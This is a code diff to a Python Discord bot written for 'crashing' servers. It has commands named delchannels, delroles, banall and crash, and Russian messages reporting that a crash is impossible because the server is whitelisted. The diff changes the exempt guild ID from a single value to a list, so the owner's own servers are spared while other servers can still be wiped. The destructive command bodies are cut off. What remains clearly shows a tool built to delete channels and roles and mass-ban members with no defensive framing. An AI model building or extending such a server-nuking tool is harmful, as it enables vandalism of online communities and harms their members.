@@ -16,15 +16,16 @@ dr = []
 bl = []
 crserv = []
 
+g = [747500947911213249, 779094480900194324]
+
 @Bot.command()
 async def delchannels(ctx):
  guild = ctx.guild
  channels = guild.channels
  author = ctx.author
- g = 747500947911213249
  if guild.id not in dc:
    dc.append(guild.id)
-   if guild.id == g:
+   if guild.id in g:
     await ctx.message.delete()
     await author.send('Краш невозможен! Сервер в белом списке!')
    else:
@@ -42,10 +43,10 @@ async def delroles(ctx):
  guild = ctx.guild
  author = ctx.author
  roles = guild.roles
- g = 747500947911213249
+ g = [747500947911213249,776803884764889128]
  if guild.id not in dr:
    dr.append(guild.id)
-   if guild.id == g:
+   if guild.id in g:
     await ctx.message.delete()
     await author.send('Краш невозможен! Сервер в белом списке!')
    else:
@@ -63,10 +64,10 @@ async def banall(ctx):
  guild = ctx.guild
  members = guild.members
  author = ctx.author
- g = 747500947911213249
+ g = [747500947911213249,776803884764889128]
  if guild.id not in bl:
   bl.append(guild.id)
-  if guild.id == g:
+  if guild.id in g:
     await ctx.message.delete()
     await author.send('Краш невозможен! Сервер в белом списке!')
   else:
@@ -88,10 +89,10 @@ async def crash(ctx):
  roles = guild.roles
  author = ctx.author
  gid = ctx.guild.id
- g = 747500947911213249
+ g = [747500947911213249,776803884764889128]
  if guild.id not in csrl:
   csrl.append(guild.id)
-  if guild.id == g:
+  if guild.id in g:
      await ctx.message.delete()
      await author.send('Краш невозможен! Сервер в белом списке!')
   else:
